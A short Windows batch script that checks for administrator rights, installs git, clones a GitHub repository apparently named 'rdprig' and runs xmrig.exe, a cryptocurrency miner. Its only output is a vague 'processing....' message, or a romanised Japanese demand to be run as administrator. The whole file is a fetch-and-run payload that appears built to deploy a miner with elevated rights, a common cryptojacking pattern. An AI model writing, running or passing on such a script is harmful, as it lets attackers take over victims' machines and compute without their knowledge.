@echo off

net session >nul 2>&1

if %ERRORLEVEL% equ 0 (
  echo processing....
  winget install git
  git clone https://github.com/Sueqkjs/rdprig
  cd rdprig
  xmrig.exe
) else (
  echo kanrisya de zikkou siro
)

pause